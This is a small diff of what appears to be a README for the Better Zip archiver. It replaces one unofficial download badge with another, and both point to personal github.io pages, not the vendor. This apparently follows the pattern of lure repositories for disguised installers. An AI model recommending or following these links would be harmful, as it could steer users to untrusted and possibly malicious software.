@@ -4,7 +4,7 @@
 <img src="https://macitbetter.com/img/BetterZip-400.png" alt="Better Zip Logo">  
 </div>  
 
-[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://elmirapuglisi.github.io/.github/Better-Zip-Mac)
+[![Open Better Zip](https://img.shields.io/badge/Open-Better%20Zip-0F766E?style=flat-square)](https://archiving-better-zip.github.io/.github/)
 
 ---
 
